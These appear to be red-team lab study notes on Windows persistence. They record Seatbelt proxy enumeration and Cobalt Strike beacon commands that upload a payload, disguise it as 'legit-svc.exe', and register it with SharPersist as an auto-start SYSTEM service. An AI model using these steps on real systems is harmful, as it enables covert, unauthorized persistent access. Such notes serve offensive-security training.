
As we have seen user is running thourgh a proxy:

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe - Internet Settings

====== InternetSettings ======

  HKCU                       ProxyEnable : 1
  HKCU                     ProxyOverride : *.cyberbotic.io;<local>
  HKCU                       ProxyServer : squid.dev.cyberbotic.io:3128
  
```

 So we cannot use http listeners for SYSTEM. We must use DNS or P2P.

## Windows Services

As we saw in in the previous chapter, there are many Windows services that run as SYSTEM.  Our various means of exploiting services for privilege escalation also act as persistence, but at the cost of breaking the legitimate service.  Instead, we can create our own service which won't impact on existing services.

```
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\legit-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: legit-svc

[+] SUCCESS: Service persistence added
```

> [!important] 
> Use svc payload since we are creating a service. 


This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START. 

This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.

Use connect localhost 4444 to connect to the beacon.
